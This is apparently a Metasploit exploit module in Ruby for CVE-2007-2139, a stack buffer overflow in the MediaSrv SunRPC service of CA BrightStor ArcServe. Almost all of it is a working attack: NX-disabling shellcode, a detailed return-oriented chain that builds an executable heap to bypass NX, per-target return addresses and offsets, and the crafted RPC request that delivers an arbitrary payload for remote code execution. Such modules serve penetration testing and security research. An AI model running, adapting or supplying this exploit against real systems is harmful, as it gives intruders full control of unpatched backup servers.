require 'msf/core'

module Msf

class Exploits::Windows::Brightstor::MediasrvSunrpc < Msf::Exploit::Remote

	include Exploit::Remote::SunRPC

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'CA BrightStor ArcServe Media Service Stack Overflow',
			'Description'    => %q{
				This exploit targets a stack overflow in the MediaSrv RPC service of CA 
				BrightStor Arcserve. By sending a specially crafted SUNRPC request, an attacker
				can overflow a stack buffer and execute arbitrary code. 
			},
			'Author'         => [ 'toto' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 5364 $',
			'References'     =>
				[
					[ 'BID', '23635'],
					[ 'CVE', '2007-2139'],
					[ 'URL', 'https://www.zerodayinitiative.com/advisories/ZDI-07-022.html'],
				],
			'Privileged'     => true,
			'Platform'       => 'win',
			'Payload'        =>
				{
					'Space'    => 0x300,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c_",
					'Prepend' => 
							# Disable NX on 2k3 to upload data on the stack
							# (service crashes if the stack is switched to the heap)
							"\x64\x8b\x0d\x30\x00\x00\x00"              + # mov ecx, dword ptr fs:[0x30] ; PEB
							"\x83\xb9\xa4\x00\x00\x00\x05"              + # cmp dword ptr [ecx+0xa4], 5  ; MajorVersion == 5
							"\x75\x30"                                  + # jnz after
							"\x83\xb9\xa8\x00\x00\x00\x02"              + # cmp dword ptr [ecx+0xa8], 2  ; MinorVersion == 2
							"\x75\x27"                                  + # jnz after
							"\x81\xb9\xac\x00\x00\x00\xce\x0e\x00\x00"  + # cmp dword ptr [ecx+0xac], 0xece  ; BuildVersion (> SP0)
							"\x76\x1b"                                  + # jbe after
							"\x8d\x89\xa8\x00\x00\x00"                  + # lea ecx, [ecx+0xa8]
							"\xba\x00\x03\xfe\x7f"                      + # mov edx, 0x7ffe0300
							"\xb8\xed\x00\x00\x00"                      + # mov eax, 0xed
							"\x6a\x04"                                  + # push 4
							"\x51"                                      + # push ecx
							"\x6a\x22"                                  + # push 22
							"\x6a\xff"                                  + # push -1
							"\x6a\xff"                                  + # push -1 (padding)
							"\xff\x12",                                   # call dword ptr[edx]
					'StackAdjustment' => -10000,

				},
			'Targets'        =>
				[
					['BrightStor Arcserve 9.0 (?) - 11.5 SP2 (Windows 2000)', { 'Ret' => 0x1002b715 , 'Off' => 0x304} ],
					['BrightStor Arcserve 9.0 (?) - 11.5 SP2 (Windows 2003)', { 'Ret' => 0x1002b715 , 'Off' => 0x300} ],
					['BrightStor Arcserve 11.1 - 11.5 SP2 (Windows All - NX Support)', { 'Ret' => 0x41414141 } ],
				],

			'DisclosureDate' => 'Apr 25 2007',
			'DefaultTarget' => 0
		))
	end

	def exploit
		sunrpc_create('tcp', 0x6097e, 1)

		if target.name =~ /NX/
			# summary:
			#
			# 1) get the payload address
			# 2) copy the payload into a fixed buffer (data section)
			# 3) allocate an executable heap buffer (to bypass NX)
			# 4) copy back the payload into the heap
			# 5) jmp to the payload in the heap
			#
			# step 1: jmp arround the atoi pointers
			# 
			# add esp, 20h
			# retn
			#
			# step 2: get a pointer to the stack in ecx
			#
			# xor eax, eax
			# mov ecx, dword ptr fs:[0]
			# cmp dword ptr [ecx+4], offset __unwind_handler
			# jnz end
			# [...]
			# end:
			# retn
			#
			# step 3: mov the stack pointer in eax
			#
			# mov eax, ecx
			# add esp, 20h
			# retn
			#
			# step 4: set fffff824h in esi
			#
			# pop esi
			# retn
			#
			# step 5: add esi to eax (eax points to the payload in the stack)
			#
			# add eax, esi
			# pop esi
			# retn
			#
			# step 6: set edi to a buffer we can write (6d515301h)
			#
			# pop edi
			# retn
			#
			# step 7: copy the payload to the buffer
			#
			# push eax
			# push 	edi
			# call _strcpy_0
			# pop ecx
			# pop ecx
			# retn
			#
			# step 8: set ecx to ffffffh
			#
			# pop ecx
			# retn
			#
			# step 9: mov ecx to eax (ffffffff -> MEM_EXECUTABLE)
			#
			# mov eax, ecx
			# add esp, 20h
			# retn
			#
			# step 10: create an executable heap
			#
			# push 0
			# cmp [esp+4+arg_0], eax
			# push 1000h
			# setz al
			# push eax
			# call ds:HeapCreate    ; create a new heap (executable for NX)
			# test eax, eax
			# mov hHeap, eax
			# jz short loc_6d5071b5
			# call ___sbh_heap_init
			# test eax, eax
			# jnz short loc_6d5071b8
			# push hHeap
			# call ds:HeapDestroy
			# loc_6d5071b5:
			# xor eax, eax
			# retn
			# loc_6d5071b8:
			# push 1
			# pop eax
			# retn
			#
			# step 11: Allocate a new heap buffer (size 01060101h)
			#
			# push hHeap
			# call ds:HeapAlloc
			# pop edi
			# pop esi
			# retn
			#
			# step 12: set esi to the buffer containing the payload  (6d515301h)
			#
			# pop esi
			# retn
			#
			# step 13: copy the payload to the heap (executable)
			#
			# push esi
			# push eax
			# call _strcpy_0
			# pop ecx
			# pop ecx
			# pop esi
			# retn
			#
			# step 14: go to the heap
			#
			# call eax
			#
			# step 15:
			# if 2k3 the prepend data disables NX to upload and execute
			# data on the stack
			#
			# step 16: w00t!

			data = Rex::Text.rand_text_alphanumeric(0x600)

			# ret 1
			data[ 0x100, 4 ] = [ 0x6d5010e4 ].pack('V')

			# used to store the result of atoi
			data[ 0x108, 4 ] = [ 0x6d51652b ].pack('V')
			data[ 0x10C, 4 ] = [ 0x6d51652b ].pack('V')
			data[ 0x110, 4 ] = [ 0x6d51652b ].pack('V')
			data[ 0x114, 4 ] = [ 0x6d51652b ].pack('V')
			data[ 0x118, 4 ] = [ 0x6d51652b ].pack('V')
			data[ 0x11C, 4 ] = [ 0x6d51652b ].pack('V')

			# ret 2		
			data[ 0x124, 4 ] = [ 0x6d50b27a ].pack('V')	

			# ret 3
			data[ 0x128, 4 ] = [ 0x6d5010e2 ].pack('V')	

			# ret 4
			data[ 0x14C, 4 ] = [ 0x6d50aa6d ].pack('V')
			data[ 0x150, 4 ] = [ 0xfffff824 ].pack('V')

			# ret 5
			data[ 0x154, 4 ] = [ 0x6d50aa6b ].pack('V')

			# ret 6
			data[ 0x15C, 4 ] = [ 0x6d5057a0 ].pack('V')
			data[ 0x160, 4 ] = [ 0x6d515301 ].pack('V')

			# ret 7
			data[ 0x164, 4 ] = [ 0x6d50b938 ].pack('V')

			# ret 8
			data[ 0x178, 4 ] = [ 0x6d502df0 ].pack('V')
			data[ 0x17C, 4 ] = [ 0xffffffff ].pack('V')

			# ret 9
			data[ 0x180, 4 ] = [ 0x6d5010e2 ].pack('V')

			# ret 10
			data[ 0x1a4, 4 ] = [ 0x6d507182 ].pack('V')

			# ret 11
			data[ 0x1a8, 4 ] = [ 0x6d505c2c ].pack('V')
			data[ 0x1ac, 4 ] = [ 0xffffffff ].pack('V')
			data[ 0x1b0, 4 ] = [ 0x01060101 ].pack('V')

			# ret 12
			data[ 0x1bc, 4 ] = [ 0x6d50aa6d ].pack('V')
			data[ 0x1c0, 4 ] = [ 0x6d515301 ].pack('V')
		
			# ret 13
			data[ 0x1c4, 4 ] = [ 0x6d50f648 ].pack('V')

			# ret 14
			data[ 0x1cc, 4 ] = [ 0x6d506867 ].pack('V')

			data[ 0x260 , payload.encoded.length ] = payload.encoded

		else
			data = Rex::Text.rand_text_alphanumeric(0xA64)
			off = target['Off']

			data[ off, payload.encoded.length] = payload.encoded
			data[ off + 0x73c, 2 ] = "\xeb\x06"			
			data[ off + 0x740, 4 ] = [ target.ret ].pack('V')
			data[ off + 0x744, 5 ] = "\xe9\xb7\xf8\xff\xff"
		end

		data = "_" + data + "_1_1_1_1_1_1_1_1_1"

		request = XDR.encode(1, 1, 2, 2, 2, data, 3, 3)

		print_status("Trying target #{target.name}...")

		begin
			ret = sunrpc_call(0xf5, request)
			sleep (20)
		rescue
		end

		sunrpc_destroy
		
		handler
		disconnect

	end
end
end	
